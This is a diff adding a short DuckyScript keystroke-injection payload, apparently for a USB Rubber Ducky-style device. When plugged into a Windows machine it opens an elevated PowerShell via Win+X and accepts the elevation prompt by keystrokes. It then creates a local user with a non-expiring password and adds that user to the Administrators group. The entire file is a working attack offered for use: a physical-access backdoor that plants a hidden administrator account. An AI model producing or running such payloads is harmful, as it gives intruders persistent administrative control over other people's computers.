@@ -1,0 +1,25 @@
+REM this script creates a new admin account on the local machine
+REM made by calinux
+
+
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+TAB
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 1500
+STRING New-LocalUser -Name "Username" -Password (ConvertTo-SecureString -String "Password" -AsPlainText -Force) -AccountNeverExpires -UserMayNotChangePassword
+DELAY 1000
+ENTER
+STRING Add-LocalGroupMember -Group "Administrators" -Member "Username"
+DELAY 1000
+ENTER
+DELAY 500
+STRING exit
+DELAY 500
+ENTER
